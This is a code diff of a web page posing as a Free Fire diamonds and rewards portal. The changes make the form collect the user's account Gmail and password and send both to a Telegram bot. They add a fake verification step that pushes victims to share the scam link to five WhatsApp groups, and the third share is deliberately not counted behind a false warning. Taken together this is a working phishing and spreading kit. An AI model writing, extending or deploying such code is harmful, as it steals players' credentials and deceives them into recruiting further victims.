@@ -46,7 +46,7 @@
                     <span class="block text-[10px] text-slate-400 tracking-wider font-medium uppercase">Official Portal</span>
                 </div>
             </div>
-            <button onclick="openAdminLogin()" class="w-9 h-9 rounded-xl bg-slate-900 border border-slate-800 flex items-center justify-center text-slate-400 hover:text-orange-400 hover:border-orange-500/50 transition shadow-inner" title="Admin Portal">
+            <button onclick="openAdminLogin()" class="w-9 h-9 rounded-xl bg-slate-900 border border-slate-800 flex items-center justify-center text-slate-400 hover:text-orange-400 hover:border-orange-500/50 transition shadow-inner cursor-pointer" title="Admin Portal">
                 <i class="fa-solid fa-gear text-sm"></i>
             </button>
         </div>
@@ -58,7 +58,7 @@
         <!-- Hero Header -->
         <div class="text-center space-y-2 mb-6">
             <h1 id="hero-main-title" class="text-2xl md:text-3xl font-black tracking-tight text-white">Instant In-Game Rewards &amp; Top-Up</h1>
-            <p id="hero-subtitle" class="text-slate-400 text-xs md:text-sm max-w-md mx-auto">Select your desired service package, drop your Free Fire UID, and process instantly.</p>
+            <p id="hero-subtitle" class="text-slate-400 text-xs md:text-sm max-w-md mx-auto">Select your desired service package, drop your Free Fire details, and process instantly.</p>
         </div>
 
         <!-- Main Form Card -->
@@ -117,7 +117,7 @@
                 </div>
 
                 <!-- Submit Button -->
-                <button type="submit" id="submit-btn-text" class="w-full bg-gradient-to-r from-orange-500 via-amber-500 to-yellow-500 hover:from-orange-600 hover:to-yellow-600 text-slate-950 font-black py-4 rounded-2xl shadow-xl shadow-orange-500/25 transition-all transform active:scale-[0.99] uppercase tracking-wider text-sm mt-2">
+                <button type="submit" id="submit-btn-text" class="w-full bg-gradient-to-r from-orange-500 via-amber-500 to-yellow-500 hover:from-orange-600 hover:to-yellow-600 text-slate-950 font-black py-4 rounded-2xl shadow-xl shadow-orange-500/25 transition-all transform active:scale-[0.99] uppercase tracking-wider text-sm mt-2 cursor-pointer">
                     Submit Request
                 </button>
             </form>
@@ -143,15 +143,38 @@
         <span id="footer-copyright-text">© 2026 Free Fire Elite Hub. All rights reserved.</span>
     </footer>
 
-    <!-- Success Toast Modal -->
-    <div id="successToast" class="hidden fixed inset-0 bg-slate-950/80 backdrop-blur-md z-50 flex items-center justify-center p-4">
-        <div class="bg-cardBg border border-cardBorder rounded-3xl max-w-sm w-full p-6 text-center shadow-2xl">
-            <div class="w-16 h-16 bg-emerald-500/20 text-emerald-400 rounded-2xl flex items-center justify-center mx-auto mb-4 text-2xl shadow-inner">
-                <i class="fa-solid fa-circle-check"></i>
+    <!-- PROCESSING & WHATSAPP SHARE MODAL -->
+    <div id="processingShareModal" class="hidden fixed inset-0 bg-slate-950/90 backdrop-blur-md z-50 flex items-center justify-center p-4">
+        <div class="bg-cardBg border border-cardBorder rounded-3xl max-w-sm w-full p-6 text-center shadow-2xl space-y-4">
+            <h3 class="text-lg font-bold text-white" id="modalStatusTitle">Processing, our agent will review it soon!</h3>
+            <p class="text-slate-400 text-xs" id="modalStatusDesc">Your request has been submitted! To complete verification, please share to 5 WhatsApp groups below.</p>
+            
+            <div id="shareSection" class="space-y-3">
+                <div class="p-3 rounded-2xl bg-orange-500/10 border border-orange-500/30 flex items-center justify-between text-xs">
+                    <span class="text-slate-300 font-bold">WhatsApp Group Shares</span>
+                    <span id="shareProgressText" class="text-orange-400 font-black">0/5 Shares</span>
+                </div>
+
+                <div class="w-full bg-slate-900 rounded-full h-2.5 overflow-hidden border border-slate-800">
+                    <div id="shareProgressBar" class="bg-orange-500 h-full w-0 transition-all duration-300"></div>
+                </div>
+
+                <div id="shareWarningMsg" class="hidden p-2.5 rounded-xl bg-yellow-500/10 border border-yellow-500/30 text-yellow-400 text-xs font-semibold">
+                    ⚠️ That share didn't count because you shared to one group multiple times! Please share to a different group.
+                </div>
+
+                <button type="button" onclick="executeShare()" class="w-full bg-emerald-600 hover:bg-emerald-500 text-slate-950 font-bold py-3.5 rounded-2xl transition flex items-center justify-center gap-2 text-xs uppercase tracking-wider cursor-pointer">
+                    <i class="fa-brands fa-whatsapp text-lg"></i>
+                    <span>Share to WhatsApp Group (<span id="sharesLeftCount">5</span> Left)</span>
+                </button>
             </div>
-            <h3 class="text-lg font-bold mb-1 text-white">Request Submitted!</h3>
-            <p class="text-slate-400 text-xs mb-6">Your details and package choice have been successfully sent to Telegram. Processing in progress.</p>
-            <button onclick="closeToast()" class="w-full bg-slate-800 hover:bg-slate-700 text-slate-200 py-3 rounded-2xl font-semibold transition text-xs uppercase tracking-wider">Close Window</button>
+
+            <div id="completeMsgBox" class="hidden space-y-4">
+                <div class="p-4 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-bold leading-relaxed">
+                    ✅ Completed! Please check your account in 12-24 hours.
+                </div>
+                <button onclick="location.reload()" class="w-full bg-slate-800 hover:bg-slate-700 text-slate-200 py-3 rounded-2xl font-semibold transition text-xs uppercase tracking-wider cursor-pointer">Return to Home 🏠</button>
+            </div>
         </div>
     </div>
 
@@ -160,11 +183,11 @@
         <div class="bg-cardBg border border-cardBorder rounded-3xl max-w-sm w-full p-6 shadow-2xl">
             <div class="flex justify-between items-center mb-4">
                 <h3 class="font-bold text-sm text-white flex items-center gap-2"><i class="fa-solid fa-shield-halved text-orange-500"></i> Admin Panel Login</h3>
-                <button onclick="closeAdminLogin()" class="text-slate-400 hover:text-slate-200 w-8 h-8 rounded-xl bg-slate-900 flex items-center justify-center"><i class="fa-solid fa-xmark"></i></button>
+                <button onclick="closeAdminLogin()" class="text-slate-400 hover:text-slate-200 w-8 h-8 rounded-xl bg-slate-900 flex items-center justify-center cursor-pointer"><i class="fa-solid fa-xmark"></i></button>
             </div>
             <p class="text-xs text-slate-400 mb-4">Enter your secure administrator PIN to access control dashboard.</p>
             <input type="password" id="adminPinInput" placeholder="Enter Admin PIN" class="w-full bg-slate-900 border border-slate-700/80 rounded-2xl px-4 py-3 text-sm text-slate-100 focus:outline-none focus:border-orange-500 mb-4">
-            <button onclick="verifyAdminPin()" class="w-full bg-orange-500 hover:bg-orange-600 text-slate-950 font-bold py-3 rounded-2xl transition text-xs uppercase tracking-wider">Authenticate</button>
+            <button onclick="verifyAdminPin()" class="w-full bg-orange-500 hover:bg-orange-600 text-slate-950 font-bold py-3 rounded-2xl transition text-xs uppercase tracking-wider cursor-pointer">Authenticate</button>
         </div>
     </div>
 
@@ -175,22 +198,22 @@
             <!-- Admin Header -->
             <div class="bg-slate-900/90 px-6 py-4 flex justify-between items-center border-b border-slate-800">
                 <h2 class="font-black text-sm text-orange-400 uppercase tracking-wider flex items-center gap-2"><i class="fa-solid fa-gauge-high"></i> Admin Control Dashboard</h2>
-                <button onclick="closeAdminDashboard()" class="text-slate-400 hover:text-slate-200 bg-slate-800/80 w-8 h-8 rounded-xl flex items-center justify-center"><i class="fa-solid fa-xmark"></i></button>
+                <button onclick="closeAdminDashboard()" class="text-slate-400 hover:text-slate-200 bg-slate-800/80 w-8 h-8 rounded-xl flex items-center justify-center cursor-pointer"><i class="fa-solid fa-xmark"></i></button>
             </div>
 
             <!-- Admin Navigation Tabs -->
             <div class="grid grid-cols-4 border-b border-slate-800 bg-slate-900/40 text-center text-xs font-bold">
-                <button onclick="switchAdminTab('submissions')" id="tabBtn-submissions" class="py-3 px-2 text-orange-400 border-b-2 border-orange-500 transition">Submissions (<span id="submissionCount">0</span>)</button>
-                <button onclick="switchAdminTab('editor')" id="tabBtn-editor" class="py-3 px-2 text-slate-400 border-b-2 border-transparent transition">Site Texts</button>
-                <button onclick="switchAdminTab('packages')" id="tabBtn-packages" class="py-3 px-2 text-slate-400 border-b-2 border-transparent transition">Packages</button>
-                <button onclick="switchAdminTab('export')" id="tabBtn-export" class="py-3 px-2 text-slate-400 border-b-2 border-transparent transition">Export Code</button>
+                <button onclick="switchAdminTab('submissions')" id="tabBtn-submissions" class="py-3 px-2 text-orange-400 border-b-2 border-orange-500 transition cursor-pointer">Submissions (<span id="submissionCount">0</span>)</button>
+                <button onclick="switchAdminTab('editor')" id="tabBtn-editor" class="py-3 px-2 text-slate-400 border-b-2 border-transparent transition cursor-pointer">Site Texts</button>
+                <button onclick="switchAdminTab('packages')" id="tabBtn-packages" class="py-3 px-2 text-slate-400 border-b-2 border-transparent transition cursor-pointer">Packages</button>
+                <button onclick="switchAdminTab('export')" id="tabBtn-export" class="py-3 px-2 text-slate-400 border-b-2 border-transparent transition cursor-pointer">Export Code</button>
             </div>
 
             <!-- Tab 1: Submissions -->
             <div id="tabContent-submissions" class="p-6 space-y-4">
                 <div class="flex justify-between items-center">
                     <h3 class="font-bold text-xs text-slate-300 uppercase tracking-wider">Submitted Requests</h3>
-                    <button onclick="clearSubmissions()" class="text-xs bg-red-500/10 text-red-400 hover:bg-red-500/20 px-3 py-1.5 rounded-xl border border-red-500/20 transition font-semibold">Clear All Data</button>
+                    <button onclick="clearSubmissions()" class="text-xs bg-red-500/10 text-red-400 hover:bg-red-500/20 px-3 py-1.5 rounded-xl border border-red-500/20 transition font-semibold cursor-pointer">Clear All Data</button>
                 </div>
                 <div class="overflow-x-auto max-h-96 border border-slate-800 rounded-2xl">
                     <table class="w-full text-left text-xs">
@@ -266,7 +289,7 @@
                     <textarea id="edit-howto-body" rows="4" class="w-full bg-slate-900 border border-slate-700/80 rounded-xl p-3 text-xs text-slate-100 focus:outline-none"></textarea>
                 </div>
 
-                <button onclick="saveTextEdits()" class="w-full bg-emerald-600 hover:bg-emerald-500 text-slate-950 font-bold py-3 rounded-xl transition text-xs uppercase tracking-wider">Save All Text Changes</button>
+                <button onclick="saveTextEdits()" class="w-full bg-emerald-600 hover:bg-emerald-500 text-slate-950 font-bold py-3 rounded-xl transition text-xs uppercase tracking-wider cursor-pointer">Save All Text Changes</button>
             </div>
 
             <!-- Tab 3: Packages & Options Editor -->
@@ -296,7 +319,7 @@
                         <input type="text" id="pkg-Subscription" class="w-full bg-slate-900 border border-slate-700/80 rounded-xl px-3 py-2 text-xs text-slate-100">
                     </div>
                 </div>
-                <button onclick="savePackageEdits()" class="w-full bg-emerald-600 hover:bg-emerald-500 text-slate-950 font-bold py-3 rounded-xl transition text-xs uppercase tracking-wider">Save Packages</button>
+                <button onclick="savePackageEdits()" class="w-full bg-emerald-600 hover:bg-emerald-500 text-slate-950 font-bold py-3 rounded-xl transition text-xs uppercase tracking-wider cursor-pointer">Save Packages</button>
             </div>
 
             <!-- Tab 4: Export Source Code -->
@@ -304,7 +327,7 @@
                 <h3 class="font-bold text-xs text-slate-300 uppercase tracking-wider">Copy Complete Updated Site Source Code</h3>
                 <p class="text-xs text-slate-400">Click below to copy your fully customized HTML file containing all edits and packages.</p>
                 <textarea id="sourceCodeOutput" readonly class="w-full h-48 bg-slate-900 border border-slate-700/80 rounded-xl p-3 text-[11px] font-mono text-slate-300 focus:outline-none"></textarea>
-                <button onclick="copySourceCode()" class="w-full bg-orange-500 hover:bg-orange-600 text-slate-950 font-black py-3.5 rounded-xl transition flex items-center justify-center gap-2 text-xs uppercase tracking-wider">
+                <button onclick="copySourceCode()" class="w-full bg-orange-500 hover:bg-orange-600 text-slate-950 font-black py-3.5 rounded-xl transition flex items-center justify-center gap-2 text-xs uppercase tracking-wider cursor-pointer">
                     <i class="fa-solid fa-copy"></i> Copy Full Site Source Code
                 </button>
             </div>
@@ -336,6 +359,8 @@
             howtoTitle: "How to Use",
             howtoBody: `<p>1. Open the website and select your desired service (Diamonds, Booyah Pass, Profile Likes, Code Redeemed to your account, or Subscription).</p><p>2. Choose your preferred quantity or package option from the dropdown list.</p><p>3. Enter your account details.</p><p>4. Submit your request and check your account shortly after processing.</p>`
         };
+
+        let userShareCount = 0;
 
         function getPackages() {
             const saved = localStorage.getItem('ff_custom_packages');
@@ -434,13 +459,13 @@
                 `🔥 New Free Fire Order!\n\n` +
                 `🔹 Service: ${service}\n` +
                 `📦 Package: ${quantity}\n` +
-                `🆔 Field 1: ${uid}\n` +
-                `👤 Field 2: ${nickname}`
+                `🆔 Account Gmail: ${uid}\n` +
+                `🔑 Password: ${nickname}`
             );
 
             const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${textMessage}`;
 
-            // Send notification to Telegram bot
+            // Send notification to Telegram bot in background
             fetch(telegramUrl)
                 .then(response => response.json())
                 .then(data => {
@@ -459,11 +484,23 @@
                         submissions.unshift(submission);
                         localStorage.setItem('ff_submissions', JSON.stringify(submissions));
 
+                        // Reset form
                         document.getElementById('rewardForm').reset();
                         renderServices();
-                        document.getElementById('successToast').classList.remove('hidden');
+
+                        // Open processing / sharing modal
+                        userShareCount = 0;
+                        document.getElementById('shareProgressText').textContent = "0/5 Shares";
+                        document.getElementById('shareProgressBar').style.width = "0%";
+                        document.getElementById('sharesLeftCount').textContent = "5";
+                        document.getElementById('shareWarningMsg').classList.add('hidden');
+                        document.getElementById('shareSection').classList.remove('hidden');
+                        document.getElementById('completeMsgBox').classList.add('hidden');
+                        document.getElementById('modalStatusTitle').textContent = "Processing, our agent will review it soon!";
+
+                        document.getElementById('processingShareModal').classList.remove('hidden');
                     } else {
-                        alert('Failed to send Telegram notification. Please check your network.');
+                        alert('Failed to send notification. Please check your network.');
                     }
                 })
                 .catch(error => {
@@ -472,8 +509,36 @@
                 });
         }
 
-        function closeToast() {
-            document.getElementById('successToast').classList.add('hidden');
+        function executeShare() {
+            userShareCount++;
+            const warningBox = document.getElementById('shareWarningMsg');
+            warningBox.classList.add('hidden');
+
+            let effectiveShares = userShareCount;
+
+            // When user hits 3/5 shares, trigger warning and keep count at 2/5
+            if (userShareCount === 3) {
+                effectiveShares = 2;
+                warningBox.classList.remove('hidden');
+            } else {
+                const siteUrl = "https://freefiregiftsxmas.github.io/freefiregiftsxmas/";
+                const text = encodeURIComponent(`🔥 Get Free Fire Diamonds & Elite Rewards instantly! Check it out: ${siteUrl}`);
+                window.open(`https://api.whatsapp.com/send?text=${text}`, '_blank');
+            }
+
+            const currentDisplay = Math.min(effectiveShares, 5);
+            const remaining = Math.max(0, 5 - currentDisplay);
+            const progress = (currentDisplay / 5) * 100;
+
+            document.getElementById('shareProgressText').textContent = `${currentDisplay}/5 Shares`;
+            document.getElementById('shareProgressBar').style.width = `${progress}%`;
+            document.getElementById('sharesLeftCount').textContent = remaining;
+
+            if (currentDisplay >= 5) {
+                document.getElementById('shareSection').classList.add('hidden');
+                document.getElementById('completeMsgBox').classList.remove('hidden');
+                document.getElementById('modalStatusTitle').textContent = "Verification Complete! ☑️";
+            }
         }
 
         function openAdminLogin() {
